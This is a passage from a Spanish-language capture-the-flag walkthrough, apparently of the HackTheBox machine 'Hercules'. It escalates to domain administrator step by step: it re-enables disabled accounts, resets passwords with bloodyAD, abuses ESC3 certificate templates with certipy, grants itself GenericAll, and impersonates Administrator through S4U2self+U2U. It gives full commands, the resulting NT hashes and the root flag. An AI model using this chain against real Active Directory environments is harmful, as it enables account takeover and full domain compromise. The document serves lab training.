DistinguishedName : CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Anthony
Name              : Anthony Rudd
ObjectClass       : user
ObjectGUID        : 61df4a73-a5b6-43f5-bec4-248a6fecfa33
SamAccountName    : anthony.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1123
Surname           : Rudd
UserPrincipalName : anthony.r@hercules.htb
```

Veremos de toda esta informacion un usuario bastante interesante, ya que si lo buscamos en nuestro `BloodHound` veremos lo siguiente:

```
DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 120435.png" alt=""><figcaption></figcaption></figure>

Vemos que pertenece al grupo llamado `SMARTCARD OPERATORS`, lo cual es muy interesante, vamos a volver habilitar dicha cuenta con este comando desde `PowerShell`.

```powershell
Enable-ADAccount -Identity "Fernando.R"
```

Echo esto vamos a ver si funciono esa modificacion:

```powershell
Get-ADUser -Identity "Fernando.R"
```

Info:

```
DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : True
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb
```

Vemos que esta en `True` la opcion de `Enable` por lo que esta habilitada la cuenta actualmente.

### Password Reset (fernando.r)

Ahora teniendo la cuenta habilitada vamos a resetear la contraseña de dicho usuario desde el usuario de `Auditor` de esta forma:

```shell
ntpdate hercules.htb ; python3 bloodyAD.py --host dc.hercules.htb -d hercules.htb -u Auditor -k set password 'fernando.r' 'P@ssw0rd!'
```

Info:

```
2025-10-23 03:16:17.868791 (-0700) -0.842844 +/- 0.015961 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.842844
[+] Password changed successfully!
```

Veremos que ha funcionado, por lo que vamos a obtener un `TGT` de dicho usuario.

```shell
ntpdate hercules.htb ; impacket-getTGT -dc-ip <IP> hercules.htb/fernando.r:P@ssw0rd!
```

Info:

```
2025-10-23 03:18:01.510325 (-0700) -0.637515 +/- 0.016607 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.637515
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fernando.r.ccache
```

Ahora vamos a exportar la variable de `kerberos` para poder utilizar el `TGT` y autenticarnos por `kerberos` como dicho usuario.

```shell
export KRB5CCNAME=fernando.r.ccache
```

Echo esto vamos a investigar las vulnerabilidades que pueda tener dicho usuario con `AD CS` (**Active Directory Certificate Services**).

```shell
ntpdate hercules.htb ; certipy-ad find -k -dc-ip <IP> -target dc.hercules.htb -vulnerable -stdout
```

Info:

```
2025-10-23 03:19:44.198918 (-0700) -0.600184 +/- 0.015573 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.600184
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'CA-HERCULES' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'CA-HERCULES'
[*] Checking web enrollment for CA 'CA-HERCULES' @ 'dc.hercules.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : CA-HERCULES
    DNS Name                            : dc.hercules.htb
    Certificate Subject                 : CN=CA-HERCULES, DC=hercules, DC=htb
    Certificate Serial Number           : 1DD5F287C078F9924ED52E93ADFA1CCB
    Certificate Validity Start          : 2024-12-04 01:34:17+00:00
    Certificate Validity End            : 2034-12-04 01:44:17+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HERCULES.HTB\Administrators
      Access Rights
        ManageCa                        : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        ManageCertificates              : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Enroll                          : HERCULES.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
  1
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
  2
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

Hemos encontrado varias vulnerabilidades criticas entre ellas `ESC3 y ESC15` vamos a probar primero con `ESC3` en la plantilla de `EnrollmentAgentOffline` que es como se llama.

```shell
ntpdate hercules.htb ; certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-host dc.hercules.htb -dc-ip <IP> -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "EnrollmentAgent" -application-policies "Certificate Request Agent"
```

Info:

```
2025-10-23 03:28:09.056678 (-0700) -0.415034 +/- 0.015193 hercules.htb 10.10.11.91 s1 no-leap
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 103
[*] Successfully requested certificate
[*] Got certificate with UPN 'fernando.r@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'
```

Veremos que ha funcionado, por lo que hemos obtenido el certificado `Request Agent`, ahora vamos a solicitar certificado en nombre de `ashley.b`.

Vamos a utilizarlo en nombre de dicho usuario ya que si investigamos un poco nos beneficia bastante por estos permisos:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 123304.png" alt=""><figcaption></figcaption></figure>

Por lo que vamos a realizar lo siguiente:

```shell
ntpdate hercules.htb ; certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip <IP> -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca "CA-HERCULES" -template "User" -pfx fernando.r.pfx -on-behalf-of "HERCULES\\ashley.b" -dcom
```

Info:

```
2025-10-23 03:31:25.086378 (-0700) -0.826432 +/- 0.031106 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.826432
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 104
[*] Successfully requested certificate
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Saving certificate and private key to 'ashley.b.pfx'
[*] Wrote certificate and private key to 'ashley.b.pfx'
```

Vemos que ha funcionado, por lo que vamos autenticarnos mediante el certificado obtenido en nombre del usuario `ashley.b`.

```shell
ntpdate hercules.htb ; certipy-ad auth -pfx ashley.b.pfx -dc-ip <IP>
```

Info:

```
2025-10-23 03:34:01.869725 (-0700) -0.662118 +/- 0.021935 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.662118
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```

Vemos que ha funcionado, hemos obtenido el `hash NTLM` de dicho usuario, por lo que vamos a utilizarlo para obtener un `TGT` del usuario utilizando el `hash`.

```shell
ntpdate hercules.htb ; impacket-getTGT -dc-ip <IP> -hashes :1e719fbfddd226da74f644eac9df7fd2 hercules.htb/ashley.b
```

Info:

```
2025-10-23 03:35:38.240960 (-0700) -0.580142 +/- 0.015199 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.580142
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ashley.b.ccache
```

Vemos que ha funcionado, por lo que vamos a exportarlo en la variable de `kerberos` de esta forma:

```shell
export KRB5CCNAME=ashley.b.ccache
```

Echo esto vamos a conectarnos por `WinRM` como hicimos anteriormente con el usuario `Auditor`:

```shell
python3 winrmexec.py -ssl -port 5986 -k -no-pass hercules.htb/ashley.b@dc.hercules.htb
```

Info:

```
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\ashley.b
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
[*] '-dc-ip' not specified, using HERCULES.HTB
[*] requesting TGS for HTTP/dc.hercules.htb@HERCULES.HTB
PS C:\Users\ashley.b\Documents> whoami
hercules\ashley.b
```

Ha funcionado, pero si vamos a nuestra carpeta de `Desktop` veremos lo siguiente:

```powershell
cd ..\Desktop
dir
```

Info:

```
Directory: C:\Users\ashley.b\Desktop

Mode                 LastWriteTime         Length Name                             
----                 -------------         ------ ----                             
d-----         12/4/2024  11:45 AM                Mail                             
-a----         12/4/2024  11:45 AM            102 aCleanup.ps1
```

Vemos un archivo llamado `aCleanup.ps1` que si lo leemos veremos lo siguiente:

```powershell
Start-ScheduledTask -TaskName "Password Cleanup"
```

Si lo ejecutamos no veremos nada:

```powershell
.\aCleanup.ps1
```

Por lo que vamos a dejar este archivo de lado en un principio.

Vamos a probar a otorgarnos permisos de `GenricAll` sobre el grupo de `IT SUPPORT` con el `OT` (`Forest Migration`) como hicimos antes con otro grupo para tener un control total sobre los objetos de este grupo.

```shell
export KRB5CCNAME=auditor.ccache
ntpdate hercules.htb ; python3 bloodyAD.py --host 'dc.hercules.htb' -d 'hercules.htb' -u 'auditor' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'
```

Info:

```
2025-10-23 03:45:40.743632 (-0700) +0.000312 +/- 0.016220 hercules.htb 10.10.11.91 s1 no-leap
[+] IT SUPPORT has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
```

Vemos que ha funcionado, por lo que ahora vamos añadir al usuario `Auditor` los privilegios de `GenericAll` al grupo de `OU`:

```shell
ntpdate hercules.htb ; python3 bloodyAD.py --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

Info:

```
2025-10-23 03:46:40.089357 (-0700) -0.188590 +/- 0.015538 hercules.htb 10.10.11.91 s1 no-leap
[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```

Vemos que ha funcionado, si ahora investigamos en `BloodHound` veremos que el grupo llamado `SERVICE OPERATORS` tiene permisos de forzar contraseña respecto a los siguientes usuarios:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 124953.png" alt=""><figcaption></figcaption></figure>

Y si investigamos el usuario llamado `IIS_WEBSERVER` vemos que tiene permisos para escribir `ACLs` en el `DC` completo, por lo que vamos a realizar lo siguiente:

Pero para ello vemos que tenemos que pasar por el usuario `IIS_ADMINISTRATOR` que esta deshabilitado, por lo que vamos a realizar lo mismo que hicimos con el usuario anterior `Fernando.r` para habilitarlo.

```shell
ntpdate hercules.htb ; python3 bloodyAD.py --host dc.hercules.htb -d hercules.htb -u 'Auditor' -k remove uac "IIS_Administrator" -f ACCOUNTDISABLE
```

Info:

```
2025-10-23 03:53:59.775784 (-0700) -0.782324 +/- 0.015868 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.782324
[+] ['ACCOUNTDISABLE'] property flags removed from IIS_Administrator's userAccountControl
```

Ahora que esta habilitada vamos a cambiarle la contraseña de esta forma:

```shell
ntpdate hercules.htb ; python3 bloodyAD.py --host dc.hercules.htb -d hercules.htb -u Auditor -k set password 'IIS_ADMINISTRATOR' 'P@ssw0rd!'
```

Info:

```
2025-10-23 04:01:09.335034 (-0700) -0.396607 +/- 0.016312 hercules.htb 10.10.11.91 s1 no-leap
[+] Password changed successfully!
```

Veremos que ha funcionado, por lo que vamos a obtener el `TGT` de dicho usuario.

```shell
ntpdate hercules.htb ; impacket-getTGT -dc-ip <IP> hercules.htb/IIS_Administrator:P@ssw0rd!
```

Info:

```
2025-10-23 04:02:02.989969 (-0700) -0.556787 +/- 0.018728 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.556787
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IIS_Administrator.ccache
```

Una vez echo esto vamos a exportarla en la variable de `kerberos` para utilizarla:

```shell
export KRB5CCNAME=IIS_Administrator.ccache
```

Ahora vamos a cambiarle la contraseña con este usuario al usuario `IIS_WEBSERVER` de esta forma:

```shell
ntpdate hercules.htb ; python3 bloodyAD.py --host dc.hercules.htb -d hercules.htb -u 'IIS_Administrator' -k set password "iis_webserver$" P@ssw0rd!
```

Info:

```
2025-10-23 04:03:49.389945 (-0700) -0.543653 +/- 0.015531 hercules.htb 10.10.11.91 s1 no-leap
CLOCK: time stepped by -0.543653
[+] Password changed successfully!
```

Vemos que ha funcionado, por lo que vamos a obtener le `hash NTLM` de dicha contraseña establecida de esta forma:

```shell
iconv -f ASCII -t UTF-16LE <(printf 'P@ssw0rd!') | openssl dgst -md4
```

Info:

```
MD4(stdin)= 217e50203a5aba59cefa863c724bf61b
```

Con esto podremos obtener el `TGT` de dicho usuario, ya que con la contraseña normal nos daba errores:

```shell
ntpdate hercules.htb ; impacket-getTGT -dc-ip <IP> -hashes :217e50203a5aba59cefa863c724bf61b 'hercules.htb/IIS_webserver$'
```

Info:

```
2025-10-23 04:08:13.091452 (-0700) -0.203732 +/- 0.016203 hercules.htb 10.10.11.91 s1 no-leap
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IIS_webserver$.ccache
```

Vemos que ha funcionado, por lo que vamos a obtener el `ticket` de sesion de dicho usuario.

```shell
impacket-describeTicket 'IIS_webserver$.ccache' | grep 'Ticket Session Key'
```

Info:

```
[*] Ticket Session Key            : d3c33ddfafd892433f366dcb110dbe73
```

Vemos que lo hemos conseguido, vamos a utilizar esta `clave` para poder cambiar la contraseña de nuevo de dicho usuario, pero exportando antes la variable de `kerberos` del nuevo `TGT`.

```shell
export KRB5CCNAME=IIS_webserver\$.ccache
impacket-changepasswd -newhashes :d3c33ddfafd892433f366dcb110dbe73 'hercules.htb'/'IIS_webserver$':'P@ssw0rd!'@'dc.hercules.htb' -k
```

Info:

```
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of hercules.htb\IIS_webserver$
[*] Connecting to DCE/RPC as hercules.htb\IIS_webserver$
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

Con esto hemos cambiado de forma correcta la contraseña del propio usuario, me costo un poco este paso ya que daba muchos errores, pero de esta forma me funciono. (Hay que ser bastante rapido si no tienes una instancia personal en `HTB`).

Ahora vamos a poder obtener el `TGT` del usuario `administrador`:

```shell
export KRB5CCNAME=IIS_webserver\$.ccache
impacket-getST -u2u -impersonate "Administrator" -spn "cifs/dc.hercules.htb" -k -no-pass 'hercules.htb'/'IIS_webserver$'
```

Info:

```
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```

Vemos que se guardo de forma correcta, por lo que ahora podremos utilizar dicho `Ticket` para podernos autenticar por `WinRM` como el usuario `Administrador` de esta forma:

```shell
export KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
python3 winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
```

Info:

```
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: hercules.htb\Administrator
[*] '-spn' not specified, using HTTP/dc.hercules.htb@hercules.htb
[*] '-dc-ip' not specified, using hercules.htb
PS C:\Users\Administrator\Documents> whoami
hercules\administrator
```

Con esto veremos que ha funcionado, por lo que podremos leer la `flag` del `admin` en la siguiente ruta.

```powershell
type C:\Users\Admin\Desktop\root.txt
```

> root.txt

```
07bbec2c40f92e7381ca7fc6a262adb5
```
